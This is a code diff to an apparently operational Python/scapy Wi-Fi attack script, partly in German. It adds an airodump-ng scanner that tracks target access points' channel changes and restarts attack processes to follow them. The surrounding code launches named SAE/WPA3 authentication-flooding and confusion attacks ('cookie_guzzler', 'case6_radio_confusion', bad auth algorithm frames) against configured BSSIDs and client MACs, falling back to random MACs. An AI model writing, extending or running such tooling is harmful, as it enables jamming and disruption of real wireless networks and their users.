@@ -21,7 +21,7 @@ import os
 import sys
 import glob
 import random
-from multiprocessing import Process, Value
+from multiprocessing import Process, Value, Manager, Lock
 from scapy.all import (
     RadioTap, Dot11, Dot11Auth, Dot11Deauth, EAPOL,
     sendp, RandMAC, Raw
@@ -163,6 +163,71 @@ MAX_RESTARTS = 100
 # =====================================================================================
 # ======================== HELPER FUNCTIONS ===========================================
 # =====================================================================================
+def parse_airodump_csv(csv_file):
+    """Robuster Parser für airodump-ng CSV Ausgaben."""
+    results = {}
+    try:
+        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+            
+        ap_block = content.split('\n\n')[0]
+        lines = ap_block.strip().split('\n')
+        
+        for line in lines:
+            if 'BSSID' in line or line.startswith('#') or not line.strip():
+                continue
+            parts = [p.strip() for p in line.split(',')]
+            if len(parts) >= 14:
+                bssid = parts[0].upper()
+                channel = parts[3].strip()
+                if not channel.isdigit(): continue
+                channel_int = int(channel)
+                
+                if bssid == TARGET_BSSID_2_4GHZ.upper() and 1 <= channel_int <= 14:
+                    results['2.4GHz'] = channel
+                elif bssid == TARGET_BSSID_5GHZ.upper() and 36 <= channel_int <= 165:
+                    results['5GHz'] = channel
+    except Exception as e:
+        print(f"[SCANNER PARSE ERROR] {e}")
+    return results
+
+def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
+    if not scanner_iface: return
+    print(f"[SCANNER] Starting on {scanner_iface} (Interval: {interval}s, Scan: {scan_duration}s)")
+    for f in glob.glob("/tmp/scan_*"):
+        try: os.remove(f)
+        except: pass
+    while True:
+        try:
+            timestamp = int(time.time())
+            prefix = f"/tmp/scan_{timestamp}"
+            cmd =['airodump-ng', '--write', prefix, '--output-format', 'csv',
+                   '--band', 'abg', '--write-interval', '2', scanner_iface]
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(scan_duration)
+            if proc.poll() is None:
+                proc.terminate(); proc.wait(timeout=2)
+            
+            csv_files = glob.glob(f"{prefix}-*.csv")
+            if csv_files:
+                latest_csv = max(csv_files, key=os.path.getctime)
+                found = parse_airodump_csv(latest_csv)
+                with lock:
+                    for band in['2.4GHz', '5GHz']:
+                        if found.get(band):
+                            old, new = shared_dict.get(band), found[band]
+                            if old != new:
+                                shared_dict[band] = new
+                                print(f"\n[!!! SCANNER] {band}: Channel changed {old} -> {new}")
+            
+            for f in glob.glob(f"{prefix}*"):
+                try: os.remove(f)
+                except: pass
+            time.sleep(max(0, interval - scan_duration))
+        except KeyboardInterrupt: break
+        except Exception as e:
+            print(f"[SCANNER ERROR] {e}")
+            time.sleep(5)
 def set_channel_scientific(interface: str, channel: str) -> bool:
     """
     Set channel scientifically correct with complete error handling.
@@ -654,6 +719,18 @@ def main():
     if not validate_configuration(): sys.exit(1)
     cleanup({})
     
+    manager = Manager()
+    shared_channels = manager.dict({'2.4GHz': MANUELLER_KANAL_2_4GHZ, '5GHz': MANUELLER_KANAL_5GHZ})
+    channel_lock = Lock()
+    
+    scanner_proc = None
+    if SCANNER_INTERFACE:
+        scanner_proc = Process(target=scanner_process, 
+                               args=(SCANNER_INTERFACE, 30, 10, shared_channels, channel_lock), 
+                               daemon=True)
+        scanner_proc.start()
+        time.sleep(2)
+    
     ap_targets = {'5ghz':{'bssid':TARGET_BSSID_5GHZ,'channel':MANUELLER_KANAL_5GHZ},
                   '2.4ghz':{'bssid':TARGET_BSSID_2_4GHZ,'channel':MANUELLER_KANAL_2_4GHZ}}
     
@@ -674,25 +751,39 @@ def main():
     
     procs, counters = {}, {i:Value('i',0) for i in ADAPTER_KONFIGURATION}
     restart_counters = {i: 0 for i in ADAPTER_KONFIGURATION}
+    active_channels = {} 
     
     print(f"\n[INFO] Starting {len(ADAPTER_KONFIGURATION)} attack processes...")
     print("Press Ctrl+C to stop.\n")
     
     try:
         while True:
+            with channel_lock:
+                ap_targets['5ghz']['channel'] = shared_channels.get('5GHz', MANUELLER_KANAL_5GHZ)
+                ap_targets['2.4ghz']['channel'] = shared_channels.get('2.4GHz', MANUELLER_KANAL_2_4GHZ)
+
             for iface, cfg in ADAPTER_KONFIGURATION.items():
                 attack, band = cfg['angriff'], cfg.get('band','5GHz')
                 if attack not in ATTACKS: continue
                 ap = ap_targets.get('5ghz' if band=='5GHz' else '2.4ghz')
                 if not ap: continue
                 
-                # Auto-Restart Logic
+                restart_needed = False
                 if iface not in procs or not procs[iface].is_alive():
+                    restart_needed = True
+                elif active_channels.get(iface) != ap['channel']:
+                    restart_needed = True 
+                
+                if restart_needed:
                     if restart_counters[iface] >= MAX_RESTARTS:
                         continue
                     
-                    # List selection logic
-                    if attack in ["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
+                    if iface in procs and procs[iface].is_alive():
+                        procs[iface].terminate()
+                        procs[iface].join(timeout=0.5)
+                        if procs[iface].is_alive(): procs[iface].kill()
+                    
+                    if attack in["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
                         s_list, f_list = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
                     elif attack in ["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
                         s_list, f_list = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
@@ -705,32 +796,36 @@ def main():
                     kw['bssid_5ghz'], kw['channel_5ghz'] = ap_targets['5ghz']['bssid'], ap_targets['5ghz']['channel']
                     kw['bssid_2_4ghz'], kw['channel_2_4ghz'] = ap_targets['2.4ghz']['bssid'], ap_targets['2.4ghz']['channel']
                     
-                    # Client selection
-                    if attack in ["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
+                    if attack in["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
                         kw['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
-                    elif attack in ["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
+                    elif attack in["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
                         kw['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
-                    elif attack not in ["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
+                    elif attack not in["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
                         kw['clients'] = TARGET_STA_MACS
                         
-                    # Fallback if no clients
-                    if not kw['clients'] and attack not in ["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
-                        kw['clients'] = [str(RandMAC()) for _ in range(3)]
+                    if not kw['clients'] and attack not in["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
+                        kw['clients'] =[str(RandMAC()) for _ in range(3)]
                         print(f"[WARN] {iface}: No clients available, using random MACs.")
                     
                     p = Process(target=ATTACKS[attack], args=(iface,counters[iface]), kwargs=kw)
                     p.start()
                     procs[iface] = p
+                    active_channels[iface] = ap['channel']
                     restart_counters[iface] += 1
                     print(f"[START] {iface} ({band}): {attack} | Restart {restart_counters[iface]}/{MAX_RESTARTS}")
             
-            # Monitor loop
             elapsed = time.time()
             status = " | ".join([f"{i}:{counters[i].value}pkts" for i in procs])
             sys.stdout.write(f"\r[MONITOR] {elapsed:.1f}s | {status}"); sys.stdout.flush(); time.sleep(0.5)
             
-    except KeyboardInterrupt: print("\n[INFO] Stopped by user.")
-    finally: cleanup(procs); print("\n[INFO] Cleanup complete.")
+    except KeyboardInterrupt: 
+        print("\n[INFO] Stopped by user.")
+    finally: 
+        cleanup(procs)
+        if scanner_proc and scanner_proc.is_alive():
+            scanner_proc.terminate()
+            scanner_proc.join()
+        print("\n[INFO] Cleanup complete.")
 
 if __name__ == "__main__":
     main()
